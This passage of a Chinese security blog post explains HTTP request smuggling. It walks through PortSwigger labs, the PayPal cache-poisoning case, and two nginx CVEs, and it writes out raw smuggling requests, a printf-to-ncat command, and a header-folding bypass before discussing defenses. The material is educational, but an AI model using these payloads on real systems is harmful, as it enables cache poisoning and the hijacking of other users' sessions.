<h2 id="3-6-Perform-Web-Cache-Poisoning"><a href="#3-6-Perform-Web-Cache-Poisoning" class="headerlink" title="3.6 Perform Web Cache Poisoning"></a>3.6 Perform Web Cache Poisoning</h2><p>这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling 进行缓存投毒，<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p>
<blockquote>
<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses.</p>
<p>To solve the lab, perform a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p>
</blockquote>
<p>这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。</p>
<p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择<code>/resources/js/tracking.js</code>进行投毒，LAB 还给了我们制造投毒的服务器，于是我们可以进行以下设置：<br><img src="http://image.v0w.top/2020/12/16086248095862.jpg" alt="投毒服务器设置"><br>(<a target="_blank" rel="noopener" href="http://image.v0w.top/2020/12/16086238774792.jpg">http://image.v0w.top/2020/12/16086238774792.jpg</a>)</p>
<p>然后构造走私请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ac331fcd1fc4121680b3459100bc00b4.web-security-academy.net</span><br><span class="line">Content-Length: 129</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;post&#x2F;next?postId&#x3D;3 HTTP&#x2F;1.1</span><br><span class="line">Host: ac9b1f2a1fd1126180bb4545012a00b0.web-security-academy.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">123</span><br></pre></td></tr></table></figure>
<p>然后访问<code>/resources/js/tracking.js</code>,发现重定向到恶意构造的地址:<br><img src="http://image.v0w.top/2020/12/16086237310898.jpg" alt="缓存js重定向到恶意地址"></p>
<p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：<br><img src="http://image.v0w.top/2020/12/16086249002894.jpg" alt="-w853"></p>
<p>可以看到成功弹窗。</p>
<p>整个流程我们可以利用以下流程来理解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |               |               |               |</span><br><span class="line">    |               |--A(1A+1&#x2F;2B)--&gt;|               | </span><br><span class="line">    |               |               |--A(1A+1&#x2F;2B)--&gt;| </span><br><span class="line">    |               |               |&lt;-A(200)-------|</span><br><span class="line">    |               |               |            [1&#x2F;2B]</span><br><span class="line">    |               |&lt;-A(200)-------|            [1&#x2F;2B]</span><br><span class="line">    |               |--C-----------&gt;|            [1&#x2F;2B]</span><br><span class="line">    |               |               |--C-----------&gt;| * ending B *</span><br><span class="line">    |               |            [*CP*]&lt;--B(200)----|</span><br><span class="line">    |               |&lt;--B(200)------|               |</span><br><span class="line">    |--C---------------------------&gt;|               |</span><br><span class="line">    |&lt;--B(200)--------------------[HIT]             |</span><br></pre></td></tr></table></figure>

<ul>
<li>1A + 1/2B means request A + an incomplete query B</li>
<li>A(X) : means X query is hidden in body of query A</li>
<li>CP : Cache poisoning</li>
</ul>
<p>与之前那个流程图类似，因为在 C 请求的<code>/resources/js/tracking.js</code>会被 Front 认为是静态资源缓存起来，而我们利用 HTTP Smuggling 将这个请求导向了我们的 exploit 服务器，返回了<code>alert(1)</code>给 C 请求，然后这个响应包就会被 Front 服务器缓存起来，这样我们就成功进行了投毒。</p>
<h2 id="3-7-Perform-Web-Cache-Deception"><a href="#3-7-Perform-Web-Cache-Deception" class="headerlink" title="3.7 Perform Web Cache Deception"></a>3.7 Perform Web Cache Deception</h2><p>其实这个场景与缓存投毒类似，但是稍有一点区别，按照比较官方的说法，缓存欺骗与缓存投毒有以下这些区别：</p>
<blockquote>
<p> What is the difference between web cache poisoning and web cache deception?</p>
<ul>
<li>In <strong>web cache poisoning</strong>, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.</li>
<li>In <strong>web cache deception</strong>, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</li>
</ul>
</blockquote>
<ul>
<li>在 Web 缓存投毒中，攻击者使应用程序将某些恶意内容存储在缓存中，并将该内容从缓存中提供给其他应用程序用户。</li>
<li>在Web缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容。</li>
</ul>
<p>我们可以这么理解，我们发送如下 HTTP 请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 43</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>
<p>该 Smugle 的请求会用<code>Foo: X</code>吃掉下一个发过来的请求头的第一行，也就是<code>GET /xxx HTTP/1.1</code>那一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;private&#x2F;messages HTTP&#x2F;1.1</span><br><span class="line">Foo: XGET &#x2F;static&#x2F;some-image.png HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Cookie: sessionId&#x3D;q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></table></figure>
<p>只要我们多发送几次，一旦用户访问的是静态资源，就可能会被 Front 服务器缓存起来，我们就可以拿到用户<code>/private/messages</code>的信息了。这里可能需要大量的重复发包，因为需要构造让静态资源缓存，还是需要一定运气的。</p>
<p>至此，HTTP Smuggling 的基本攻击面都已经介绍完毕了。总体来说，HTTP请求走私的随机性较强，需要的条件相对苛刻，测试的时候可能需要配合Intruder和Repeater重复发包。同时，其破坏用户正常请求，或者利用用户请求的攻击方式可以造成很大危害。</p>
<h1 id="0x04-实际案例"><a href="#0x04-实际案例" class="headerlink" title="0x04 实际案例"></a>0x04 实际案例</h1><h2 id="4-1-ATS"><a href="#4-1-ATS" class="headerlink" title="4.1 ATS"></a>4.1 ATS</h2><blockquote>
<p>Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。</p>
<p>Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。</p>
<p>在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。</p>
<p>CVE-2018-8004 补丁列表</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/trafficserver/pull/3192">https://github.com/apache/trafficserver/pull/3192</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/trafficserver/pull/3201">https://github.com/apache/trafficserver/pull/3201</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/apache/trafficserver/pull/3251">https://github.com/apache/trafficserver/pull/3251</a></li>
</ul>
<p>注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。</p>
</blockquote>
<p>关于这四个补丁的分析与复现我觉得 @mengchen 师傅已经写的非常详细了，我就不在赘述了，建议看原文部分 <a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#4-httpcve-2018-8004">HTTP走私攻击实例——CVE-2018-8004</a></p>
<h2 id="4-2-Paypal"><a href="#4-2-Paypal" class="headerlink" title="4.2 Paypal"></a>4.2 Paypal</h2><p>2019年分享 HTTP Smuggling 的作者在 Black Hat 上分享的 Paypal 漏洞实例：</p>
<h3 id="4-2-1-对js文件进行投毒"><a href="#4-2-1-对js文件进行投毒" class="headerlink" title="4.2.1 对js文件进行投毒"></a>4.2.1 对js文件进行投毒</h3><p>smuggling</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Content-Length: 61 </span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;webstatic HTTP&#x2F;1.1</span><br><span class="line">Host: skeletonscribe.net?</span><br><span class="line">X: X</span><br></pre></td></tr></table></figure>
<p>request a js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>完整请求如下，重定向到恶意js，进行投毒</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;webstatic HTTP&#x2F;1.1</span><br><span class="line">Host: skeletonscribe.net?</span><br><span class="line">X: XGET &#x2F;webstatic&#x2F;r&#x2F;fb&#x2F;fb-all-prod.pp2.min.js HTTP&#x2F;1.1 </span><br><span class="line">Host: c.paypal.com</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>response</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Location: http:&#x2F;&#x2F;skeletonscribe.net?, c.paypal.com&#x2F;webstatic&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="4-2-2-绕过CSP策略"><a href="#4-2-2-绕过CSP策略" class="headerlink" title="4.2.2 绕过CSP策略"></a>4.2.2 绕过CSP策略</h3><p>但是 Paypal 登录页面有 CSP 规则 <code>script-src</code> 限制了这个跳转。</p>
<p><img src="http://image.v0w.top/2020/12/43ccf8d84ffcarticlepaypal01.svg"></p>
<p>后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。</p>
<p><img src="http://image.v0w.top/2020/12/8e618cf695b8articlepaypal02.svg"></p>
<p>再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。</p>
<p><img src="http://image.v0w.top/2020/12/7fcaae230c37articlepaypal03.svg"></p>
<h3 id="4-2-3-修复与绕过"><a href="#4-2-3-修复与绕过" class="headerlink" title="4.2.3 修复与绕过"></a>4.2.3 修复与绕过</h3><p>Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></table></figure>

<h1 id="0x05-nginx两个请求走私漏洞"><a href="#0x05-nginx两个请求走私漏洞" class="headerlink" title="0x05 nginx两个请求走私漏洞"></a>0x05 nginx两个请求走私漏洞</h1><h2 id="5-1-（CVE-2019-20372）Nginx-error-page-请求走私漏洞"><a href="#5-1-（CVE-2019-20372）Nginx-error-page-请求走私漏洞" class="headerlink" title="5.1 （CVE-2019-20372）Nginx error_page 请求走私漏洞"></a>5.1 （CVE-2019-20372）Nginx error_page 请求走私漏洞</h2><p><a target="_blank" rel="noopener" href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E.md">参考链接</a></p>
<p>Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。</p>
<blockquote>
<p>错误配置</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> server_name localhost;</span><br><span class="line"> error_page 401 http:&#x2F;&#x2F;example.org;</span><br><span class="line"> location &#x2F; &#123;</span><br><span class="line"> return 401;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> server_name notlocalhost;</span><br><span class="line"> location &#x2F;_hidden&#x2F;index.html &#123;</span><br><span class="line"> return 200 &#39;This should be hidden!&#39;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这时候我们可以向服务器发送以下请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;a HTTP&#x2F;1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 56</span><br><span class="line">GET &#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">Host: notlocalhost</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看一下服务器是怎么处理的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printf &quot;GET &#x2F;a HTTP&#x2F;1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET</span><br><span class="line">&#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1\r\nHost: notlocalhost\r\n\r\n&quot; | ncat localhost 80 --noshutdown</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;example.org</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;302 Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;302 Found&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&#x2F;1.17.6&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.17.6</span><br><span class="line">Date: Fri, 06 Dec 2019 18:23:33 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 22</span><br><span class="line">Connection: keep-alive</span><br><span class="line">This should be hidden!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再一下nginx服务器里面的日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.17.0.1 - - [06&#x2F;Dec&#x2F;2019:18:23:33 +0000] &quot;GET &#x2F;a HTTP&#x2F;1.1&quot; 302 145 &quot;-&quot; &quot;-&quot; &quot;-&quot;</span><br><span class="line">172.17.0.1 - - [06&#x2F;Dec&#x2F;2019:18:23:33 +0000] &quot;GET &#x2F;_hidden&#x2F;index.html HTTP&#x2F;1.1&quot; 200 22 &quot;-&quot;</span><br></pre></td></tr></table></figure>



<h2 id="5-2-（CVE-2020-12440）Nginx-lt-1-8-0-请求走私"><a href="#5-2-（CVE-2020-12440）Nginx-lt-1-8-0-请求走私" class="headerlink" title="5.2 （CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私"></a>5.2 （CVE-2020-12440）Nginx &lt;= 1.8.0 请求走私</h2><p>Nginx&lt;=1.18.0及之前版本中存在安全漏洞。攻击者可利用该漏洞进行缓存投毒，劫持凭证或绕过安全保护。</p>
<p>没有什么特别的配置<br>CL!=0的情况<br>利用方面只需要注意计算好CL即可。可以发现这里的两个请求都进行了处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;hello.html HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.40.146</span><br><span class="line">Content-Length: 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;test.html HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.40.146</span><br><span class="line">Content-Length: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://image.v0w.top/2020/12/16086336990621.jpg" alt="CL!=0"></p>
<p>其他payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: www.0-sec.org</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">46</span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Host:www.0-sec.org</span><br><span class="line">Content-Length:15</span><br><span class="line"></span><br><span class="line">kk</span><br><span class="line">0s</span><br></pre></td></tr></table></figure>


<h1 id="0x06-Tools-amp-Check"><a href="#0x06-Tools-amp-Check" class="headerlink" title="0x06 Tools&amp;Check"></a>0x06 Tools&amp;Check</h1><p>PortSwigger开发了一个开源burp插件，用于检测http请求走私漏洞：<br><a target="_blank" rel="noopener" href="https://github.com/portswigger/http-request-smuggler">HTTP Request Smuggler</a><br>可以直接在BApp中安装，也可以在github中看到源码和编译之后的jar包，其功能主要是针对一个请求，自动化的对其可能存在HTTP请求走私，进行测试，右键<code>Launch Smuggle probe</code>可以选择很多的payload：<br><img src="http://image.v0w.top/2020/12/16086275112636.jpg" alt="smuggler-payload"></p>
<p>我们还是一个lab为例：<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>需要设置<code>Content-Length</code>和<code>Transfer-Encoding: chunked</code><br>右键选择<code>Smuggle Attack(CL-TE)</code>，Attack进行攻击，也可以进行脚本修改和选择不同的攻击脚本<br><img src="http://image.v0w.top/2020/12/16086294657551.jpg"></p>
<p>可以看到不同结果，说明存在HTTP请求走私：<br><img src="http://image.v0w.top/2020/12/16086293019966.jpg"></p>
<h1 id="0x07-防御策略"><a href="#0x07-防御策略" class="headerlink" title="0x07 防御策略"></a>0x07 防御策略</h1><blockquote>
<p>从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。</p>
<ul>
<li>禁用代理服务器与后端服务器之间的TCP连接重用。</li>
<li>使用HTTP/2协议。</li>
<li>前后端使用相同的服务器。</li>
</ul>
<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。</p>
</blockquote>
<p>然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过:</p>
<blockquote>
<p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p>
</blockquote>
<p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 <code>Request multiplexing over a single TCP connection</code> ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。</p>
<p>具体可以参考 <a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5">HTTP/2 简介</a></p>
<h1 id="0xFF-reference"><a href="#0xFF-reference" class="headerlink" title="0xFF reference"></a>0xFF reference</h1><ol>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kgkRih2MQtU">视频-HTTP Desync Attacks: Smashing into the Cell Next Door</a>-James Kettle在blackHat上分享的如何通过TE扩大HTTP走私攻击的攻击面，并给出了一些实际案例，是paper2和paper3的基础</li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">协议层的攻击——HTTP请求走私</a>-原理解释的比较清楚</li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6878">一篇文章带你读懂 HTTP Smuggling 攻击</a>-对paper2做了补充，增加一些实际攻击案例</li>
<li><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf">PDF-HTTP Desync Attacks: Smashing into the Cell Next Door</a>-vedio1的pdf版本</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">portswigger-HTTP request smuggling</a></li>
<li><a target="_blank" rel="noopener" href="https://regilero.github.io/tag/Smuggling/">Regilero关于Smuggling的文章</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37387316">知乎-HTTP协议几个版本的比较</a></li>
<li><a target="_blank" rel="noopener" href="https://tools.ietf.org/rfc/">RFC文档</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2019-20372%EF%BC%89Nginx%20error_page%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E.md">CVE-2019-20372</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ares-X/VulWiki/blob/a8a7d4d4d1530681e5b7f18daf7f471f7ff5c010/Web%E5%AE%89%E5%85%A8/Nginx/%EF%BC%88CVE-2020-12440%EF%BC%89Nginx%20%3C%3D%201.8.0%20%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81.md">CVE-2020-12440</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2020/12/20/HTTPsmuggling/">http://v0w.top/2020/12/20/HTTPsmuggling/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/%E5%8D%8F%E8%AE%AE%E5%B1%82/">协议层</a><a class="post-meta__tags" href="/tags/HTTPsmuggle/">HTTPsmuggle</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/AlipayQR.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="/img/wechatQR.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/12/29/Chrome-MixedContent/"><i class="fa fa-chevron-left">  </i><span>踩坑：谷歌Chrome浏览器默认https加载导致图片不显示&amp;如何解决</span></a></div><div class="next-post pull-right"><a href="/2020/12/14/xray_rad/"><span>xray &amp; rad</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
  avatar:'retro',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2021 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>